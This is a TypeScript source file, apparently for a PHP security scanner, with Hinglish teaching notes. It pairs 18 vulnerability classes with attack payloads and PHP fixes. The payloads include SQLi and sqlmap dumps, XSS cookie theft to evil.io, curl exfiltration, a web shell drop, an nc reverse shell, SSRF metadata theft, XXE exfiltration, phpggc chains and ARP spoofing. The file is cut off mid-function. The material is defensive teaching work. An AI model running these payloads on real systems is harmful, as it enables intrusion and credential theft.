// ARTEX PHP Static Security Scanner Engine — 18 bug classes (teacher-style)
// Har finding: attack scenario + REAL ATTACK CODE + defence + REAL DEFENCE PHP fix
// Detects: SQLi, XSS, RCE, eval, LFI, upload shell, unserialize, SSRF, XXE, CSRF,
//          SECRETS, weak-RAND, PHPINFO, DEBUG, COOKIE, WEAKHASH, open-REDIRECT, TRAVERSAL
// Dedup: same bug-class ke multiple lines EK merged card me (alsoLines) — "same same" repeats eliminated
import type { PhpFinding, PhpScanSummary } from "./types";

const USER_INPUT = ["$_GET", "$_POST", "$_REQUEST", "$_COOKIE", "$_SERVER", "$HTTP_GET_VARS", "$HTTP_POST_VARS"];
const QUERY_FNS = ["mysql_query", "mysqli_query", "mysqli::query", "pg_query", "->query(", "->exec(", "mysqli_multi_query", "sqlite_query"];
const RCE_FNS = ["system(", "exec(", "shell_exec(", "passthru(", "popen(", "proc_open(", "pcntl_exec("];
const EVAL_FNS = ["eval(", "assert(", "create_function("];
const INCLUDE_FNS = ["include ", "include(", "include_once", "require ", "require(", "require_once"];
const HTTP_FNS = ["file_get_contents(", "fopen(", "readfile(", "curl_exec(", "fsockopen(", "file("];

function lineHasAny(line: string, needles: string[]): boolean {
  return needles.some((n) => line.includes(n));
}

function usesUserInput(line: string, tainted: Set<string>): boolean {
  if (USER_INPUT.some((u) => line.includes(u))) return true;
  for (const v of tainted) {
    if (new RegExp("\\" + v + "\\b").test(line)) return true;
  }
  return false;
}

function hasSanitizer(line: string, fns: string[]): boolean {
  return fns.some((f) => line.includes(f));
}

interface Def {
  cls: string;
  cwe: string;
  attack: string;
  attackCode: string;
  defence: string;
  defenceCode: string;
}

const ATTACK_DEFS: Record<string, Def> = {
  SQLI: {
    cls: "SQL Injection",
    cwe: "CWE-89",
    attack:
      "TEACHER NOTE: SQL query ka grammar aur user data ki duniya alag hai — jab dono string-concatenation se milte hain to attacker query ka grammar khud control kar leta hai. Pehle single-quote (') bhejo: SQL warning/500 aaye to injection live hai. Phir UNION SELECT se dusri table ka data nikalo, ya boolean/time-based blind (SLEEP) se bina output ke bhi poora DB char-by-char dump karo.",
    attackCode: `# STEP 1 — detect: quote bhejo, error dekho
GET /item.php?id=1'                    → 500 / SQL warning = injectable
# STEP 2 — column count match karo
?id=1' ORDER BY 5--+                   → error aaya = 5 columns nahi; 4 try karo...
# STEP 3 — UNION se data dump
?id=-1' UNION SELECT NULL,username,password FROM users--+
# STEP 4 — blind (jab output screen pe nahi dikhta):
?id=1' AND IF(SUBSTRING(database(),1,1)='s',SLEEP(5),0)--+   ← 5s delay = guess SAHI
# AUTOMATED (authorized test):
sqlmap -u 'http://target/item.php?id=1' --batch --dump -D shop`,
    defence:
      "Prepared statements lagao — data sirf PARAMETER hota hai, SQL grammar ka hissa kabhi nahi banta. Input ko type-cast ya whitelist bhi karo.",
    defenceCode: `// DEFENCE (PHP): Prepared statements — user input ko query string me concatenate NAHI
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id AND status = :status');
$stmt->execute(['id' => $_GET['id'], 'status' => 'active']);
$user = $stmt->fetch();

// Legacy mysqli ho to:
$stmt = $mysqli->prepare('SELECT * FROM users WHERE id = ?');
$stmt->bind_param('i', $_GET['id']);
$stmt->execute();

// Extra hardening: type cast + early reject
$id = filter_var($_GET['id'] ?? '', FILTER_VALIDATE_INT);
if ($id === false) { http_response_code(400); exit('Invalid ID'); }`,
  },
  XSS: {
    cls: "Cross-Site Scripting (XSS)",
    cwe: "CWE-79",
    attack:
      "TEACHER NOTE: Attacker ka JavaScript AAPKE page ke context me chalta hai — same origin, same cookies, same DOM. Reflected XSS: payload URL me bhejo, victim click kare. Stored XSS: comment/profile me payload save karo — har visitor automatically hit hoga. Iske baad session hijack, keylogger, fake-login overlay — sab open.",
    attackCode: `# REFLECTED — ye URL victim ko bhejo (social engineering):
https://target.com/search?q=<img src=x onerror="fetch('https://evil.io/?c='+document.cookie)">
# STORED — comment box me paste karo, har visitor pe chalega:
<script>new Image().src='//evil.io/log?c='+encodeURIComponent(document.cookie)</script>
# DOM-based:
https://target.com/page#<script>location='https://evil.io/?'+document.cookie</script>
# Browser hook (beEF) — full control:
<script src="https://evil.io/hook.js"></script>`,
    defence:
      "OUTPUT time pe context-wise escape karo (input pe nahi) — HTML me htmlspecialchars, JS context me json_encode, URL me urlencode. CSP header second layer hai.",
    defenceCode: `// DEFENCE (PHP): Har output context me sahi escape
echo htmlspecialchars($userInput, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
// URL context:
echo urlencode($param);
// JS context:
echo json_encode($data, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP);

// Content-Security-Policy (defense-in-depth):
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
header("X-XSS-Protection: 1; mode=block");`,
  },
  RCE: {
    cls: "Remote Code Execution (Shell)",
    cwe: "CWE-78",
    attack:
      "TEACHER NOTE: Shell function (system/exec/...) me user data ghusa do to attacker SERVER pe apna OS command chalata hai — web app se seedha OS tak. Metacharacters (; | && $( )) se apna command chain hota hai. Output na dikhe to out-of-band callback (DNS/HTTP) se exploit confirm hota hai, phir web shell ya reverse shell se persistent access.",
    attackCode: `# Command chaining (ping/network tool me):
127.0.0.1; cat /etc/passwd
127.0.0.1 | id
127.0.0.1 && whoami
# Command substitution:
127.0.0.1 $(curl https://evil.io/hit)
# Blind confirm — OOB callback:
; curl https://evil.io/oob?d=$(whoami)-$(hostname)
# Web shell drop (writable webroot mile to):
; echo '<?php system($_GET["c"]); ?>' > /var/www/html/.cache.php
# Reverse shell (SIRF authorized lab me):
; nc -e /bin/sh attacker-lab.io 4444`,
    defence:
      "User input shell me KABHI na jaye — PHP native functions se kaam karo. Zaroori ho to strict whitelist + escapeshellarg + disable_functions.",
    defenceCode: `// DEFENCE (PHP): 1) Best — shell hatao, PHP native use karo
// 2) Unavoidable ho to: whitelist + escapeshellarg
$allowed = ['ping' => '/bin/ping', 'traceroute' => '/usr/bin/traceroute'];
$tool = $allowed[$_GET['tool'] ?? ''] ?? null;
if ($tool === null) { http_response_code(400); exit('Unknown tool'); }
$arg = escapeshellarg($_GET['target'] ?? '');   // single safe argument
system($tool . ' -c 1 ' . $arg, $ret);

// 3) Hardening:
// php.ini: disable_functions = system,exec,shell_exec,passthru,popen,proc_open
// PHP ko low-privilege user se chalao + open_basedir set karo`,
  },
  EVAL: {
    cls: "Code Injection (eval/assert)",
    cwe: "CWE-95",
    attack:
      "TEACHER NOTE: eval/assert user data ko PHP CODE bana dete hain — yani attacker ka text aapke server pe statement ban ke chalta hai. Yahan shell injection se bhi zyada power hai: file write, config modify, sab kuch. create_function aur preg_replace /e (purane PHP) bhi same trap hain.",
    attackCode: `# Direct eval($_GET['code']) ho to:
?code=system('id');
?code=file_put_contents('sh.php','<?php system($_GET["x"]);');
# Quoted eval me curly escape:
\${system('cat /etc/passwd')}
# create_function() code escape (PHP < 7.2):
}system('id');/*
# preg_replace /e modifier (PHP < 7) — payload as replacement:
preg_replace('/x/e', $_GET['cmd'], 'x');`,
    defence:
      "eval/assert/create_function production code se completely remove karo — logic ko data-driven banao (allowed-ops map). Data serialization ke liye JSON use karo.",
    defenceCode: `// DEFENCE (PHP): eval family REMOVE
// BAD:  eval('$result = ' . $userMath . ';');
// GOOD: allowed operations map — code kabhi user se nahi banta
$ops = ['add' => fn($a,$b) => $a + $b, 'mul' => fn($a,$b) => $a * $b];
$op = $ops[$_GET['op'] ?? ''] ?? null;
if (!$op) { http_response_code(400); exit('Invalid op'); }
$result = $op($a, $b);

// preg_replace /e ki jagah: preg_replace_callback() (PHP 7+ me /e removed)
// Config/data store: json_encode / json_decode — eval nahi`,
  },
  LFI: {
    cls: "Local/Remote File Inclusion",
    cwe: "CWE-98",
    attack:
      "TEACHER NOTE: include/require ka path user-controlled ho to attacker SERVER ki koi bhi file 'code ke roop me' load karwa sakta hai. ../ traversal se system files, php://filter se source-code leak (base64 me), log poisoning se RCE tak chain hota hai.",
    attackCode: `# Path traversal:
?page=../../../../etc/passwd
?page=....//....//....//etc/passwd            ← " ../" filter bypass
# Source leak (config.php ka code base64 me):
?page=php://filter/convert.base64-encode/resource=config.php
# RCE via log poisoning:
?page=/var/log/auth.log   (pehle SSH login user me '<?php system($_GET["c"]);?>' bhejo)
# RFI (agar allow_url_include=On — rare but fatal):
?page=https://evil.io/shell.txt`,
    defence:
      "Dynamic include user input se kabhi na lo — fixed whitelist map use karo. php.ini me allow_url_include=Off + open_basedir jail.",
    defenceCode: `// DEFENCE (PHP): Whitelist include map
$pages = ['home' => 'pages/home.php', 'about' => 'pages/about.php', 'contact' => 'pages/contact.php'];
$page = $pages[$_GET['page'] ?? 'home'] ?? null;
if ($page === null) { http_response_code(404); exit('Page not found'); }
include __DIR__ . '/' . $page;

// Hardening:
// php.ini: allow_url_include = Off, allow_url_fopen = Off
// open_basedir = /var/www/html:/tmp
// realpath() verify: path project root ke andar hi ho`,
  },
  UPLOAD: {
    cls: "Insecure File Upload (Web Shell)",
    cwe: "CWE-434",
    attack:
      "TEACHER NOTE: Upload validation sirf filename/extension pe ho to attacker web shell upload kar leta hai — phir uploads/ URL pe direct RCE. Extension tricks (.php.jpg, %00, .phtml), MIME header spoof, aur image-polyglot (GIF header + PHP) classic bypass hain.",
    attackCode: `# Simple shell upload:
curl -F "f=@shell.php" https://target.com/upload.php
→ https://target.com/uploads/shell.php?c=id
# Extension filter bypass:
shell.php.jpg    shell.pHp    shell.php%00.jpg    shell.php5    shell.phtml
# MIME check bypass (Content-Type header spoof):
curl -F 'f=@shell.php;type=image/jpeg' https://target.com/upload.php
# getimagesize() bypass — GIF polyglot:
GIF89a
<?php system($_GET["c"]); ?>
(shell.gif naam se upload, phir .php access)`,
    defence:
      "Extension + REAL MIME (finfo) + size check, random rename, aur uploads dir me PHP execution disable — chaaron zaroori.",
    defenceCode: `// DEFENCE (PHP): 4-layer upload validation
$allowed = ['jpg' => 'image/jpeg', 'png' => 'image/png', 'gif' => 'image/gif'];
$ext = strtolower(pathinfo($_FILES['f']['name'] ?? '', PATHINFO_EXTENSION));
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime = $finfo->file($_FILES['f']['tmp_name']);
if (!isset($allowed[$ext]) || $allowed[$ext] !== $mime) {
    http_response_code(400); exit('Only JPG/PNG/GIF allowed');
}
if ($_FILES['f']['size'] > 2 * 1024 * 1024) { exit('Max 2MB'); }
$newName = bin2hex(random_bytes(16)) . '.' . $ext;   // random rename
move_uploaded_file($_FILES['f']['tmp_name'], __DIR__ . '/uploads/' . $newName);
chmod(__DIR__ . '/uploads/' . $newName, 0644);
// nginx: location /uploads/ { location ~ \\.php$ { return 403; } }
// Apache .htaccess (uploads/): php_flag engine off`,
  },
  UNSERIALIZE: {
    cls: "Unsafe Deserialization (Object Injection)",
    cwe: "CWE-502",
    attack:
      "TEACHER NOTE: unserialize() attacker-controlled string se OBJECT bana deta hai — object banne par __wakeup/__destruct magic methods AUTO-CHALTE hain. App (ya iske libraries) me ek bhi exploitable 'gadget' class ho to attacker uski property values set karke file-delete, SQLi ya full RCE trigger karta hai (POP chain).",
    attackCode: `# Serialized payload cookie/param me bhejo:
O:8:"Template":1:{s:4:"file";s:14:"../../etc/passwd";}
# File-delete gadget example:
O:7:"FileSvc":1:{s:8:"filename";s:11:"../index.php";}
# Framework gadget chains (phpggc):
phpggc Monolog/RCE1 system 'id' -b      ← URL-encode karke cookie me daalo
# Agar source me __destruct(__wakeup) hai to yahi entry point hai`,
    defence:
      "User input par unserialize kabhi nahi — JSON use karo. Compulsory ho to allowed_classes=false + HMAC integrity check.",
    defenceCode: `// DEFENCE (PHP): JSON-first
$data = json_decode($_POST['data'] ?? '{}', true);
if (json_last_error() !== JSON_ERROR_NONE) { http_response_code(400); exit('Bad payload'); }

// Agar serialize zaroori hai (internal-only):
$raw = $_COOKIE['state'] ?? '';
$data = unserialize($raw, ['allowed_classes' => false]);  // gadget chain DEAD
// + HMAC integrity: hash_hmac('sha256', $serialized, $SECRET) decode se pehle verify`,
  },
  SSRF: {
    cls: "Server-Side Request Forgery",
    cwe: "CWE-918",
    attack:
      "TEACHER NOTE: Server khud fetch karta hai — to attacker URL dekar use INTERNAL network ka darwaza bana deta hai. Cloud me sabse bada prize: 169.254.169.254 metadata service se IAM credentials. file:// se local files, gopher:// se Redis/SMTP takeover.",
    attackCode: `# AWS metadata — IAM keys leak:
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Internal-only services:
http://127.0.0.1:8080/admin      http://internal-db.prod:3306
# Scheme abuse:
file:///etc/passwd
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
# IP-block bypass: decimal/redirect tricks
http://2130706433/    https://evil.io →302→ http://169.254.169.254/`,
    defence:
      "URL validate karo: scheme allowlist (http/https), host resolve karke private/reserved IP ranges block, redirects disable.",
    defenceCode: `// DEFENCE (PHP): URL validation + IP blocklist
$url = filter_var($_GET['url'] ?? '', FILTER_VALIDATE_URL);
if ($url === false || !in_array(parse_url($url, PHP_URL_SCHEME), ['http','https'], true)) {
    http_response_code(400); exit('Invalid URL');
}
$ip = gethostbyname(parse_url($url, PHP_URL_HOST));
if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
    http_response_code(403); exit('Internal targets blocked');
}
// + curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
// + egress firewall: server se sirf allowed external hosts`,
  },
  XXE: {
    cls: "XML External Entity Injection (XXE)",
    cwe: "CWE-611",
    attack:
      "TEACHER NOTE: XML ke DOCTYPE me attacker apne ENTITIES define kar sakta hai — parser &x; expand karta hai jabki x koi bhi file/URL ho sakta hai. Result: file read, SSRF, blind exfil, ya Billion-Laughs DoS.",
    attackCode: `# File read:
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
# Cloud metadata:
<!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&x;</r>
# Blind OOB exfil (response me kuch nahi dikhta):
<!DOCTYPE r [<!ENTITY % d SYSTEM "https://evil.io/?leak=x">%d;]>
# Billion Laughs DoS:
<!ENTITY a "aaaa"> <!ENTITY b "&a;&a;&a;&a;&a;"> <!ENTITY c "&b;&b;&b;&b;&b;">`,
    defence:
      "External entity loading disable karo (LIBXML_NONET), user se XML hi na lo to best — JSON.",
    defenceCode: `// DEFENCE (PHP): PHP < 8.0
libxml_disable_entity_loader(true);
$xml = simplexml_load_string($raw, 'SimpleXMLElement', LIBXML_NONET | LIBXML_NOENT);

// PHP 8.0+ (entity loader already off — phir bhi NONET):
$dom = new DOMDocument();
$dom->loadXML($raw, LIBXML_NONET | LIBXML_NOENT | LIBXML_DTDLOAD);
// BEST: user-facing XML hatao — JSON use karo
// + $dom->schemaValidate('strict.xsd') agar schema hai`,
  },
  CSRF: {
    cls: "Cross-Site Request Forgery",
    cwe: "CWE-352",
    attack:
      "TEACHER NOTE: Browser cross-site request me cookies AUTO-attach karta hai — yani attacker ki site se bheja gaya form request server ko 'legit user' lagta hai. Attacker auto-submitting form rakhta hai; logged-in victim page kholta hai aur action (transfer/email-change) chupchap execute ho jata hai.",
    attackCode: `<!-- attacker-site.html — victim ke browser me auto-submit -->
<html><body onload="document.f.submit()">
<form name="f" action="https://target.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker-account">
  <input type="hidden" name="amount" value="50000">
</form></body></html>
<!-- GET-state-change ho to bas image tag kaafi hai:
<img src="https://target.com/admin/delete-user?id=42"> -->`,
    defence:
      "Har state-changing form me session-bound CSRF token + hash_equals verify. Cookies pe SameSite=Lax/Strict + sensitive actions pe re-auth.",
    defenceCode: `// DEFENCE (PHP): Synchronizer token pattern
session_start();
if (empty($_SESSION['csrf'])) { $_SESSION['csrf'] = bin2hex(random_bytes(32)); }
// Form me: <input type="hidden" name="csrf" value="<?= htmlspecialchars($_SESSION['csrf']) ?>">
if (!hash_equals($_SESSION['csrf'] ?? '', $_POST['csrf'] ?? '')) {
    http_response_code(403); exit('CSRF token mismatch');
}
// + SameSite cookie: session_set_cookie_params(['samesite'=>'Lax','secure'=>true,'httponly'=>true]);
// + sensitive action pe password re-confirmation`,
  },
  SECRETS: {
    cls: "Hardcoded Credentials / Secrets",
    cwe: "CWE-798",
    attack:
      "TEACHER NOTE: Code me hardcoded key/password = PERMANENT leak. Repo kabhi public hua, log me chhapa, ya client bundle me gaya — to seedha DB/cloud takeover. Git history me purani keys bhi survive karti hain, isliye 'delete kar diya' kaafi nahi.",
    attackCode: `# Git history scan:
gitleaks detect --source . --report-path leaks.json
trufflehog filesystem --directory=. --json
# GitHub public-search dorks:
"sk_live_" filename:.env       "API_KEY =" language:php
"DB_PASSWORD" extension:ini
# Key mil gayi to: AWS → s3/ec2 takeover; SMTP → spam relay; DB → full dump`,
    defence:
      "Secrets source me kabhi nahi — environment (webroot ke bahar .env) ya secret manager se. Leak ho chuki key = COMPROMISED, rotate + revoke.",
    defenceCode: `// DEFENCE (PHP): Environment se lo
// .env (webroot ke BAHAR, .gitignore me): DB_PASSWORD=... STRIPE_KEY=...
$pass = getenv('DB_PASSWORD') ?: ($_ENV['DB_PASSWORD'] ?? '');
if ($pass === '') { exit('Config missing'); }

// Better: AWS Secrets Manager / Vault runtime fetch
// + leaked key: turant rotate karo, purani REVOKE karo
// + git history rewrite kaafi nahi — keys compromise maano`,
  },
  RAND: {
    cls: "Insecure Randomness (Predictable Tokens)",
    cwe: "CWE-338",
    attack:
      "TEACHER NOTE: rand/mt_rand/uniqid CRYPTOGRAPHICALLY secure nahi hain — output predictable hai. Reset token / OTP / session id inhi se bana ho to attacker value GUESS kar sakta hai: seed reconstruct, ya chhoti range brute-force. Account takeover yahin se hota hai.",
    attackCode: `# uniqid() = timestamp-based — predictable:
uniqid()  →  "6789ab" + microsec   (server clock ke around brute-force)
# mt_rand token — seed guess:
# attacker ko 2-3 outputs mile to Mersenne Twister state recover hota hai
# Chhota range:
for ($g = 0; $g < 1000000; $g++) { try_token(mt_rand(100000,999999)); }  // OTP crack`,
    defence:
      "Security tokens sirf CSPRNG se — random_bytes() / random_int(). Compare hash_equals() se, token single-use + expiry ke saath.",
    defenceCode: `// DEFENCE (PHP): CSPRNG-only
$resetToken = bin2hex(random_bytes(32));    // 256-bit unpredictable
$otp = random_int(100000, 999999);

// BAD: rand(), mt_rand(), srand(), uniqid() — security ke liye KABHI nahi
// + token compare: hash_equals($expected, $given)  (timing-safe)
// + reset token: single-use + 15 min expiry + rate-limit`,
  },
  PHPINFO: {
    cls: "phpinfo() Exposure",
    cwe: "CWE-200",
    attack:
      "TEACHER NOTE: phpinfo() ek hi page me poori server ki ID card deta hai — document root, versions, extensions, disable_functions, env vars (kabhi DB creds bhi). Attacker isse EXACT CVE match karta hai, guess-work zero.",
    attackCode: `# Recon in one request:
curl -s https://target.com/phpinfo.php | grep -Ei 'DOCUMENT_ROOT|disable_functions|_ENV|SERVER\\[|VERSION'
# Mile to: PHP version → known CVE; paths → LFI targets; extensions → attack surface`,
    defence:
      "Production me phpinfo() completely remove karo; debug page chahiye to IP-allowlist + auth ke peeche + disable_functions me phpinfo.",
    defenceCode: `// DEFENCE (PHP): grep -rn "phpinfo" /var/www/html/ → sab hits DELETE
// Temporary debug page chahiye to:
if (!in_array($_SERVER['REMOTE_ADDR'] ?? '', ['127.0.0.1'], true)) {
    http_response_code(404); exit('Not found');
}
// php.ini: disable_functions = phpinfo  (defense-in-depth)`,
  },
  DEBUG: {
    cls: "Debug Mode / Verbose Errors in Production",
    cwe: "CWE-489",
    attack:
      "TEACHER NOTE: display_errors=On pe attacker ko FREE debugging milti hai — malformed input bhejo, stack trace se file paths, SQL queries, versions sab leak. Ye 'information disclosure' chhota lagta hai par exploit chain ka pehla kadam hota hai.",
    attackCode: `# Errors trigger karo:
curl 'https://target.com/item.php?id=1%27'
curl -X POST https://target.com/api -H 'Content-Type: application/json' -d '{bad json'
# Response me: Fatal error ... /var/www/html/lib/db.php on line 42  ← path + line + query`,
    defence:
      "display_errors Off, log_errors On — user ko generic error page, details sirf log me. Debug helpers (var_dump/print_r) deploy se pehle remove.",
    defenceCode: `// DEFENCE (PHP): production config
// php.ini: display_errors = Off, display_startup_errors = Off
//          log_errors = On, error_log = /var/log/php/error.log
error_reporting(E_ALL);   // errors LOG me, screen pe NAHI
// Custom handler: set_exception_handler(fn() => http_response_code(500) && exit('Server error'));`,
  },
  COOKIE: {
    cls: "Cookie Without Security Flags",
    cwe: "CWE-1004",
    attack:
      "TEACHER NOTE: HttpOnly missing = ek chhota sa XSS session cookie chura lega (JS se document.cookie). Secure missing = HTTP pe cookie plaintext me travel karti hai — same-WiFi MITM. SameSite missing = CSRF ke liye darwaza khula.",
    attackCode: `# HttpOnly missing — XSS se exfil:
<img src=x onerror="new Image().src='//evil.io/?c='+document.cookie">
# Secure missing — same-network MITM:
arpspoof -i wlan0 -t VICTIM_IP GATEWAY_IP    + wireshark: http.cookie contains PHPSESSID
# Stolen cookie browser me paste → victim ki full session`,
    defence:
      "Har cookie pe teeno flags: Secure + HttpOnly + SameSite. Sessions ke liye session_set_cookie_params use karo.",
    defenceCode: `// DEFENCE (PHP): sab flags har cookie pe
setcookie('sid', $val, [
    'expires'  => time() + 3600,
    'path'     => '/',
    'secure'   => true,      // sirf HTTPS
    'httponly' => true,      // JS blocked
    'samesite' => 'Lax',     // CSRF mitigated
]);
// Sessions (session_start se pehle):
session_set_cookie_params(['lifetime'=>0,'path'=>'/','secure'=>true,'httponly'=>true,'samesite'=>'Lax']);`,
  },
  WEAKHASH: {
    cls: "Weak Cryptographic Hash (md5/sha1)",
    cwe: "CWE-327",
    attack:
      "TEACHER NOTE: MD5/SHA1 passwords ke liye DEAD — GPU rig ~100 billion MD5/sec karta hai. DB leak (ek SQLi) ho to top-million wordlist + hashcat se majority passwords minutes me crack. Collision attacks se signature forgery bhi possible.",
    attackCode: `# Cracked (leaked hash list):
hashcat -m 0 hashes.txt rockyou.txt      # MD5 — modern GPU pe billions/sec
hashcat -m 100 hashes.txt rockyou.txt    # SHA1
# Online rainbow (common passwords instant):
md5decrypt.net  ·  crackstation.net`,
    defence:
      "Passwords ke liye sirf password_hash() (bcrypt/argon2, auto-salt). md5/sha1 sirf non-security checksums ke liye theek.",
    defenceCode: `// DEFENCE (PHP): password_hash — built-in bcrypt/argon2
$hash = password_hash($password, PASSWORD_DEFAULT);
if (password_verify($password, $hash)) { /* login OK */ }
// Legacy upgrade: login pe re-hash
if (password_needs_rehash($hash, PASSWORD_DEFAULT)) {
    $newHash = password_hash($password, PASSWORD_DEFAULT);
}`,
  },
  REDIR: {
    cls: "Open Redirect",
    cwe: "CWE-601",
    attack:
      "TEACHER NOTE: Redirect destination user-controlled ho to attacker AAPKE domain ke URL me apna phishing site chhupa deta hai — 'https://bank.com/login?next=...' dekh ke victim trust karta hai, phir evil-phish.io pe pahunch ke creds de deta hai. OAuth me authorization codes bhi isse hijack hote hain.",
    attackCode: `# Phishing link (legit domain as wrapper):
https://target.com/redirect?url=https://evil-phish.io/login-clone
# Filter bypass variants:
//evil-phish.io    /\\evil-phish.io    https:evil-phish.io    %2F%2Fevil-phish.io
# OAuth:
?redirect_uri=https://trusted.com.evil.io/callback`,
    defence:
      "Redirect destinations whitelist karo ya relative-path-only rule lagao — raw user URL Location header me kabhi nahi.",
    defenceCode: `// DEFENCE (PHP): Whitelist redirect
$next = $_GET['next'] ?? '/dashboard';
$allowed = ['/dashboard', '/profile', '/home'];
if (!in_array($next, $allowed, true)) { $next = '/dashboard'; }
header('Location: ' . $next); exit;

// Ya relative-only:
if (preg_match('#^/[a-z]#i', $next) && !str_contains($next, '//')) {
    header('Location: ' . $next);
}`,
  },
  TRAVERSAL: {
    cls: "Path Traversal (Destructive File Op)",
    cwe: "CWE-22",
    attack:
      "TEACHER NOTE: File operation ka path user se aa raha hai to ../ se webroot ke BAHAR kisi bhi file tak pahunch — read (file_get_contents), ya destructive (unlink/rmdir se site delete). Archive extract me ../ chhupana (zip-slip) bhi same family hai.",
    attackCode: `# Read:
?file=../../../../etc/passwd
?file=....//....//etc/passwd
# Destructive (unlink($_GET['file']) shape):
?file=../../index.php          ← homepage delete
?file=../../../etc/nginx/nginx.conf
# Zip-slip:
zip evil.zip ../../../var/www/html/shell.php   → extract se RCE file`,
    defence:
      "basename() se traversal strip, realpath() canonicalize karke project-root jail verify — tabhi file op karo. Delete ops pe CSRF + confirm + audit log.",
    defenceCode: `// DEFENCE (PHP): Canonicalize + jail
$file = basename($_GET['file'] ?? '');          // traversal strip
$base = realpath(__DIR__ . '/user-files');
$target = realpath(__DIR__ . '/user-files/' . $file);
if ($target === false || !str_starts_with($target, $base . DIRECTORY_SEPARATOR)) {
    http_response_code(403); exit('Invalid path');
}
unlink($target);   // ab jail ke andar hi hai
// + delete pe CSRF token + confirm flow + audit log`,
  },
};

function pushFinding(
  findings: PhpFinding[],
  code: keyof typeof ATTACK_DEFS,
  line: number,
  snippet: string,
  severity: PhpFinding["severity"]
) {
  const def = ATTACK_DEFS[code];
  if (!def) return;
  findings.push({
    id: `${code}-${line}-${findings.length}`,
    bugClass: def.cls,
    code,
    cwe: def.cwe,
    severity,
    line,
    snippet: snippet.trim().slice(0, 300),
    attack: def.attack,
    attackCode: def.attackCode,
    defence: def.defence,
    defenceCode: def.defenceCode,
  });
}

// MERGE: same bug-class ke repeats ek card me — "same same" findings khatam
function mergeDuplicates(findings: PhpFinding[]): PhpFinding[] {
  const byCode = new Map<string, PhpFinding>();
  const merged: PhpFinding[] = [];
  for (const fd of findings) {
    const prev = byCode.get(fd.code);
    if (prev) {
      if (!prev.alsoLines) prev.alsoLines = [];
      prev.alsoLines.push(fd.line);
      // severity upgrade: merged instance zyada severe ho to card ko upgrade karo
      const rank: Record<string, number> = { CRITICAL: 0, HIGH: 1, MEDIUM: 2, LOW: 3, INFO: 4 };
      if ((rank[fd.severity] ?? 9) < (rank[prev.severity] ?? 9)) prev.severity = fd.severity;
      continue;
    }
    byCode.set(fd.code, fd);
    merged.push(fd);
  }
  return merged;
}

export function scanPhpCode(source: string): { findings: PhpFinding[]; summary: PhpScanSummary } {
  const lines = source.split(/\r?\n/);
  const raw: PhpFinding[] = [];
  const tainted = new Set<string>();
  const whole = source;

  // Whole-file context flags
  // FIX: bare "token" bahut loose tha (reset_token/api_token false-positive) — csrf/_token/xsrf only
  const hasCsrfCheck = /(csrf|_token|xsrf)['"]?\s*\]?\s*(\?\?|=)|hash_equals\(|csrf_token|X-CSRF/i.test(whole);
  const hasUploadValidation =
    /(finfo|getimagesize|pathinfo|in_array\s*\(\s*\$|mime_content_type|is_uploaded_file|\.(jpg|png|gif|jpeg|pdf|zip)['"])/i.test(whole);
  const hasXxeGuard = /(libxml_disable_entity_loader|LIBXML_NONET|LIBXML_NOENT|XINCLUDE|substituteEntities\s*=\s*false)/i.test(whole);
  const postsStateChange = /(INSERT INTO|UPDATE\s+\w+\s+SET|DELETE FROM|\$_SESSION\s*\[[^\]]+\]\s*=|unlink\(|file_put_contents\()/i.test(whole);

  for (let i = 0; i < lines.length; i++) {
    const rawLine = lines[i];
    const line = rawLine.trim();

    // ---- taint tracking: $x = $_GET[...] / $x = trim($_POST[...]) etc.
    const taintAssign = line.match(/^\$([A-Za-z_]\w*)\s*=\s*(.+);?$/);
    if (taintAssign) {
      const [, varName, rhs] = taintAssign;
      const sanitized = /(htmlspecialchars|htmlentities|intval|filter_var|strip_tags|escapeshellarg|floatval|abs\(|preg_replace|urlencode|json_decode|prepared|prepare\(|bind_param|execute)/.test(rhs);
      const isUser = USER_INPUT.some((u) => rhs.includes(u));
      const fromTainted = [...tainted].some((v) => new RegExp("\\" + v + "\\b").test(rhs));
      if (isUser || (fromTainted && !sanitized)) tainted.add("$" + varName);
      if (sanitized && isUser) tainted.delete("$" + varName);
    }

    // ---- 1) SQLi
    if (lineHasAny(line, QUERY_FNS) && usesUserInput(line, tainted) && !hasSanitizer(line, ["prepare(", "bind_param", "quote(", "intval(", "filter_var"])) {
      pushFinding(raw, "SQLI", i + 1, rawLine, "CRITICAL");
    }

    // ---- 2) XSS (line-start echo/print + inline echo/print $var + <?= tag — one-line pastes bhi cover)
    if ((/\b(?:echo|print)\b[^;]*\$/.test(line) || /<\?=/.test(line)) && usesUserInput(line, tainted) && !hasSanitizer(line, ["htmlspecialchars", "htmlentities", "urlencode", "json_encode", "strip_tags", "intval"])) {
      pushFinding(raw, "XSS", i + 1, rawLine, line.includes("$_REQUEST") || line.includes("$_GET") ? "HIGH" : "MEDIUM");
    }

    // ---- 3) RCE (shell)
    if (lineHasAny(line, RCE_FNS) && usesUserInput(line, tainted) && !hasSanitizer(line, ["escapeshellarg", "escapeshellcmd"])) {
      pushFinding(raw, "RCE", i + 1, rawLine, "CRITICAL");
    } else if (lineHasAny(line, RCE_FNS) && /`[^`]*\$\w+/.test(line)) {
      pushFinding(raw, "RCE", i + 1, rawLine, "CRITICAL");
    }

    // ---- 4) eval / code injection
    if (lineHasAny(line, EVAL_FNS)) {
      pushFinding(raw, "EVAL", i + 1, rawLine, usesUserInput(line, tainted) ? "CRITICAL" : "HIGH");
    }
    if (/preg_replace\s*\(\s*['"][^'"]*\/[a-z]*e[a-z]*['"]/i.test(line)) {
      pushFinding(raw, "EVAL", i + 1, rawLine, "HIGH");
    }

    // ---- 5) LFI / RFI
    if (lineHasAny(line, INCLUDE_FNS) && usesUserInput(line, tainted) && !hasSanitizer(line, ["basename(", "realpath(", "in_array(", "str_replace"])) {
